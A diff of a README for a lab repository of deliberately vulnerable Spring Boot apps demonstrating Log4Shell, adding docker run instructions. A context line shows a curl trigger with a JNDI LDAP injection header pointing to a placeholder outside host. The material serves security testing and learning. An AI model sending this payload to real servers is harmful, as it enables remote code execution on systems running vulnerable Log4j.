@@ -3,12 +3,18 @@
 This repository contains Spring Boot web applications vulnerable to [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/).
 
 
-## Variants
-### cve-2021-44228 (log4j-core: 2.14.1)
+# Variants
+## cve-2021-44228 (log4j-core: 2.14.1)
 * JDK: openjdk:8u312-jdk-slim
 * SpringLog4J: org.springframework.boot:spring-boot-starter-log4j2:2.6.1 (https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-log4j2/2.6.1)
 * log4j-core: 2.14.1
 
+Run it:
+```bash
+sudo docker run -p 8000:8080 --rm ghcr.io/denniskniep/vulnerable-app-log4shell-2.14.1:latest
+```
+
+Build it yourself:
 ```bash
 cd log4j-2.14.1
 sudo docker build -t vulnerable-app-log4shell-2.14.1 .
@@ -21,7 +27,7 @@ Trigger the vulnerability using:
 curl 127.0.0.1:8000 -H 'X-Api-Version: ${jndi:ldap://your-private-ip.com/abc}'
 ```
 
-### cve-2021-45046 (log4j-core: 2.15.0)
+## cve-2021-45046 (log4j-core: 2.15.0)
 https://www.whitesourcesoftware.com/resources/blog/log4j-vulnerability-cve-2021-45046/
 
 
@@ -29,6 +35,12 @@ https://www.whitesourcesoftware.com/resources/blog/log4j-vulnerability-cve-2021-
 * SpringLog4J: org.springframework.boot:spring-boot-starter-log4j2:2.6.1 (https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-log4j2/2.6.1)
 * log4j-core: 2.15.0
 
+Run it:
+```bash
+sudo docker run -p 8000:8080 --rm ghcr.io/denniskniep/vulnerable-app-log4shell-2.15.0:latest
+```
+
+Build it yourself:
 ```bash
 cd log4j-2.15.0
 sudo docker build -t vulnerable-app-log4shell-2.15.0 .
